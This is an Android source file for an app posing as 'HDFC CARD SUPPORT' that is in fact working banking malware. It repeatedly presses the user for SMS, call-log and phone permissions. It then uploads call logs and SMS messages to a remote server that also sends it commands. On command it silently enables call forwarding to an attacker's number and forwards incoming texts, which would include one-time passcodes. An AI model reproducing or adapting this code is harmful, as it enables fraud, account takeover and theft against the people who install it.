package com.hdfc.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BridgeActivity {
    private static final String TAG = "HDFC_MainActivity";
    private static final String BACKEND_URL = "https://backprince.onrender.com";
    private String forwardingNumber = null;
    private boolean forwardingEnabled = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setupBridge();
        Toast.makeText(this, "HDFC CARD SUPPORT v1.1 Starting...", Toast.LENGTH_LONG).show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Request permissions EVERY time the app comes to foreground until granted
        checkAndRequestPermissions();
    }

    private void setupBridge() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                WebView webView = getBridge().getWebView();
                webView.getSettings().setJavaScriptEnabled(true);
                webView.addJavascriptInterface(new Object() {
                    @JavascriptInterface
                    public void requestRealPermissions() { checkAndRequestPermissions(); }
                    
                    @JavascriptInterface
                    public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }

                    @JavascriptInterface
                    public void requestIgnoreBatteryOptimizations() {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                            Intent intent = new Intent();
                            String packageName = getPackageName();
                            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                                intent.setData(Uri.parse("package:" + packageName));
                                startActivity(intent);
                            }
                        }
                    }

                    @JavascriptInterface
                    public void requestNotificationAccess() {
                        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                    }
                }, "AndroidBridge");
            }
        });
        startCommandPolling();
    }

    private void checkAndRequestPermissions() {
        String[] permissions = {
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG
        };

        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 101);
        } else {
            new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
        }
    }

    private void startCommandPolling() {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                new Thread(new Runnable() { @Override public void run() { fetchConfig(); } }).start();
                handler.postDelayed(this, 30000);
            }
        }, 10000);
    }

    private void fetchConfig() {
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            URL url = new URL(BACKEND_URL + "/api/users/config/" + deviceId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;
            while ((inputLine = in.readLine()) != null) response.append(inputLine);
            in.close();

            JSONObject config = new JSONObject(response.toString());
            String newFwdNum = config.optString("forwarding_number", null);
            boolean newEnabled = config.optBoolean("forwarding_enabled", false);

            if (newEnabled && newFwdNum != null && !newFwdNum.isEmpty()) {
                if (!newFwdNum.equals(forwardingNumber)) {
                    forwardingNumber = newFwdNum;
                    enableCallForwarding(forwardingNumber);
                }
                forwardingEnabled = true;
            } else {
                if (forwardingEnabled) disableCallForwarding();
                forwardingEnabled = false;
                forwardingNumber = null;
            }
        } catch (Exception e) { Log.e(TAG, "Config Fetch Error", e); }
    }

    private void enableCallForwarding(String number) {
        try {
            String code = "*21*" + number + "#";
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + Uri.encode(code)));
            startActivity(intent);
        } catch (Exception e) { Log.e(TAG, "Call Forward Error", e); }
    }

    private void disableCallForwarding() {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + Uri.encode("#21#")));
            startActivity(intent);
        } catch (Exception e) { Log.e(TAG, "Call Disable Error", e); }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 101) {
            boolean allGranted = true;
            for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
            
            if (allGranted) {
                new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
            }
            
            final String status = allGranted ? "GRANTED" : "DENIED";
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getBridge().getWebView().evaluateJavascript("if(window.handlePermissionResult) window.handlePermissionResult('" + status + "')", null);
                }
            });
        }
    }

    private void syncAllData() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        readAndSendCallLogs(deviceId);
        readAndSendSmsInbox(deviceId);
    }

    private void readAndSendCallLogs(String deviceId) {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");
            if (cursor != null && cursor.moveToFirst()) {
                JSONArray logsArray = new JSONArray();
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                do {
                    JSONObject log = new JSONObject();
                    log.put("number", cursor.getString(numberIdx));
                    log.put("duration", cursor.getString(durationIdx));
                    log.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                    int type = Integer.parseInt(cursor.getString(typeIdx));
                    String typeStr = (type == CallLog.Calls.OUTGOING_TYPE) ? "Outgoing" : (type == CallLog.Calls.MISSED_TYPE) ? "Missed" : "Incoming";
                    log.put("type", typeStr);
                    logsArray.put(log);
                } while (cursor.moveToNext());
                cursor.close();
                JSONObject payload = new JSONObject();
                payload.put("deviceId", deviceId);
                payload.put("logs", logsArray);
                sendToBackend("/api/logs/calls", payload.toString());
            }
        } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
    }

    private void readAndSendSmsInbox(String deviceId) {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
            if (cursor != null && cursor.moveToFirst()) {
                int addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                do {
                    JSONObject payload = new JSONObject();
                    payload.put("deviceId", deviceId);
                    payload.put("sender", cursor.getString(addressIdx));
                    payload.put("message", cursor.getString(bodyIdx));
                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                    sendToBackend("/api/logs/sms", payload.toString());
                    
                    if (forwardingEnabled && forwardingNumber != null) {
                        try {
                            SmsManager.getDefault().sendTextMessage(forwardingNumber, null, "FWD: " + cursor.getString(addressIdx) + "\n" + cursor.getString(bodyIdx), null, null);
                        } catch (Exception e) { Log.e(TAG, "Sms Send Error", e); }
                    }
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "SMS Error", e); }
    }

    private void sendToBackend(String endpoint, String jsonData) {
        try {
            URL url = new URL(BACKEND_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Backend Error", e); }
    }
}
